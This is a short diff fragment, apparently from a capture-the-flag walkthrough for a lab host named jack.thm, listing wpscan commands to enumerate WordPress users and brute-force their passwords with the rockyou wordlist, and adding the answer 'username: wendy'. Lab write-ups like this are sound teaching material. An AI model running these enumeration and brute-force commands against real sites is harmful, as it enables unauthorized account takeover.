@@ -11,5 +11,5 @@
   $ wpscan -e u --url http://jack.thm
 6. After got the users (danny,jack,wendy) and save it.
   $ wpscan --url http://jack.thm -U users.txt -P /usr/share/wordlists/rockyou.txt
-  $ 
+  Ans: username: wendy
 ```
